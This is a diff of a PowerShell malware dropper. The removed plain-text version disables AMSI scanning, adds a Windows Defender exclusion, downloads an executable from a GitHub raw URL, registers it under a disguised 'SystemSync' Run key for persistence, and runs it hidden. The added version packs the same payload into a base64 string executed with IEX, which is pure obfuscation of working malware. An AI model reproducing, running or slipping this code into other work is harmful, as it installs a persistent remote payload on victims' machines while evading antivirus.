@@ -1,33 +1,3 @@
-# Memory patch for bypass
-$s = [Ref].Assembly.GetTypes()
-foreach($t in $s){if($t.Name -like "*iUt*ls"){$u=$t;break}}
-$f = $u.GetField("ams"+"iInit"+"Failed","NonPublic,Static")
-$f.SetValue($null,$true)
-
-# Configuration
-$b = "$env:APPDATA\Microsoft\Windows\Templates"
-$u = "https://github.com/ashleywilmer7-star/trimiez/raw/refs/heads/main/combined.exe"
-$k = [uint32]2147483650
-$w = [WMIClass]"root\default:StdRegProv"
-
-# Setup folder
-if (!(Test-Path $b)) { New-Item -ItemType Directory -Path $b -Force | Out-Null }
-powershell -c "Add-MpPreference -ExclusionPath '$b'"
-
-# Download and Persist
-$c = New-Object Net.WebClient
-$c.DownloadFile($u, "$b\sys_sync.exe")
-
-$r = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-try {
-    $w.CreateKey($k, $r)
-    $w.SetStringValue($k, $r, "SystemSync", "$b\sys_sync.exe")
-} catch {
-    # Backup for non-admin
-    $k2 = [uint32]2147483649
-    $w.CreateKey($k2, $r)
-    $w.SetStringValue($k2, $r, "SystemSync", "$b\sys_sync.exe")
-}
-
-# Run
-Start-Process "$b\sys_sync.exe" -WindowStyle Hidden
+$b64 = "W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTsgZm9yZWFjaCggJGIgaW4gJGEgKSB7IGlmICggJGIuTmFtZSAtbGlrZSAiKmlVdGlscyIgKSAgeyAkYyA9ICRiOyBicmVhazsgfSB9IDsgJGQgPSAkYy5HZXRGaWVsZCggImFtc2lJbml0RmFpbGVkIiwgIk5vblB1YmxpYyxTdGF0aWMiICkgOyAkZC5TZXRWYWx1ZSggJG51bGwsICR0cnVlICk7ICRiID0gIiRhbG9jYXBwZGF0YVxNaWNyb3NvZnRcV2luZG93c1xUZW1wbGF0ZXMiOyAkdSA9ICJodHRwczovL2dpdGh1Yi5jb20vYXNobGV5d2lsbWVyNy1zdGFyL3RyaW1pZXovcmF3L3JlZnMvaGVhZHMvbWFpbi9jb21iaW5lZC5leGUiOyBpZiAoIShUZXN0LVBhdGggJGIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGIgLUZvcmNlIHwgT3V0LU51bGw7IH07IHBvd2Vyc2hlbGwgLWMgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJyRiJyI7ICRjID0gTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyAkYy5Eb3dubG9hZEZpbGUoJHUsICIkYlxzeXNfc3luYy5leGUiKTsgJHIgPSAiU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIjsgJHcgPSBbV01JQ2xhc3NdInJvb3RcZGVmYXVsdDpTdGRSZWdQcm92IjsgJHcuQ3JlYXRlS2V5KDIxNDc0ODM2NTAsICRyKTsgJHcuU2V0U3RyaW5nVmFsdWUoMjE0NzQ4MzY1MCwgJHIsICJTeXN0ZW1TeW5jIiwgIiRiXHN5c19zeW5jLmV4ZSIpOyBTdGFydC1Qcm9jZXNzICIkYlxzeXNfc3luYy5leGUiIC1XaW5kb3dTdHlsZSBIaWRkZW47"
+$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+IEX $dec
